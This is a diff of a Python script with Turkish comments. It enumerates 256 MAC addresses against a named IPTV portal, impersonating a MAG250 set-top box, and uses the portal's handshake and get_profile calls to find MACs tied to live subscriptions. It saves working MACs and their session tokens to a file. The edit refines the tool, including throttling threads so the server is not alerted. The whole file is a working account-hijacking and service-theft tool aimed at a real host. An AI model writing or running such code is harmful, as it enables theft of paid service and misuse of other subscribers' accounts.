@@ -1,11 +1,12 @@
 import requests
 import concurrent.futures
+import json
 
-# Ana URL
-portal_url = "http://dm.lion-ott.com/portal.php"
+# Portal API adresi
+api_url = "http://dm.lion-ott.com/portal.php"
 
-def tam_kontrol(mac):
-    # Gerçek bir MAG cihazı kimliği oluşturuyoruz
+def derin_kontrol(mac):
+    # Gerçek bir MAG cihazı gibi davranan başlıklar
     headers = {
         'User-Agent': 'MAG250',
         'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
@@ -13,44 +14,51 @@ def tam_kontrol(mac):
         'Referer': 'http://dm.lion-ott.com/c/',
         'Connection': 'Keep-Alive'
     }
-    
+
     try:
-        # Adım 1: Handshake (Anahtar isteme)
-        auth_url = f"{portal_url}?type=stb&action=handshake&token="
-        res = requests.get(auth_url, headers=headers, timeout=7)
+        # Adım 1: Handshake yaparak geçici Token almayı dene
+        handshake_url = f"{api_url}?type=stb&action=handshake&token="
+        response = requests.get(handshake_url, headers=headers, timeout=10)
         
-        if res.status_code == 200 and "token" in res.text.lower():
-            # Adım 2: Profil kontrolü (Gerçekten abonelik var mı?)
-            token = res.json().get('js', {}).get('token', '')
-            profile_url = f"{portal_url}?type=stb&action=get_profile&token={token}"
-            profile_res = requests.get(profile_url, headers=headers, timeout=7)
+        if response.status_code == 200:
+            data = response.json()
+            token = data.get('js', {}).get('token', '')
             
-            if profile_res.status_code == 200:
-                # Eğer buraya kadar geldiyse bu MAC %100 canlıdır
-                print(f"✅ CANLI YAYIN: {mac}")
-                return f"{mac} | DURUM: IZLENEBILIR | TOKEN ALINDI"
+            if token:
+                # Adım 2: Token ile profil bilgilerini (tarih vb.) çekmeyi dene
+                profile_url = f"{api_url}?type=stb&action=get_profile&token={token}"
+                profile_res = requests.get(profile_url, headers=headers, timeout=10)
+                
+                if profile_res.status_code == 200:
+                    profile_data = profile_res.json()
+                    # Eğer profil verisi geliyorsa, bu MAC %100 GERÇEKTİR
+                    print(f"🔥 GERÇEK MAC BULDUM: {mac}")
+                    return f"{mac} | DURUM: AKTIF | TOKEN: {token}"
     except:
         pass
     return None
 
 def baslat():
-    # Senin çalışan bloğun üzerinden 256 ihtimali tara
+    # Çalışan bloğun (00:1A:79:7C:6B) üzerinden 256 ihtimal
     base = "00:1A:79:7C:6B"
-    denenecekler = [f"{base}:{hex(i)[2:].zfill(2).upper()}" for i in range(256)]
+    mac_listesi = [f"{base}:{hex(i)[2:].zfill(2).upper()}" for i in range(256)]
     
-    print(f"🚀 Derin tarama başlatıldı... Gerçek çalışanlar aranıyor.")
+    print(f"🚀 {len(mac_listesi)} adres için derin doğrulama başladı...")
     
-    canli_list = []
-    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
-        sonuclar = list(executor.map(tam_kontrol, denenecekler))
-        canli_list = [s for s in sonuclar if s]
+    gercek_calisanlar = []
+    # Sunucuyu yormadan 10 thread ile yavaş ve temiz tara
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        sonuclar = list(executor.map(derin_kontrol, mac_listesi))
+        gercek_calisanlar = [s for s in sonuclar if s]
 
     with open("calisan_maclar.txt", "w") as f:
-        if canli_list:
-            for c in canli_list:
-                f.write(f"http://dm.lion-ott.com/c/ | {c}\n")
+        if gercek_calisanlar:
+            for m in gercek_calisanlar:
+                f.write(f"http://dm.lion-ott.com/c/ | {m}\n")
+            print(f"✅ {len(gercek_calisanlar)} adet GERÇEK çalışan bulundu.")
         else:
-            f.write("Bu blokta izlenebilir aktif adres bulunamadı.")
+            f.write("Maalesef bu blokta doğrulanmış (Token alan) MAC bulunamadı.")
+            print("😔 Doğrulanmış MAC bulunamadı.")
 
 if __name__ == "__main__":
     baslat()
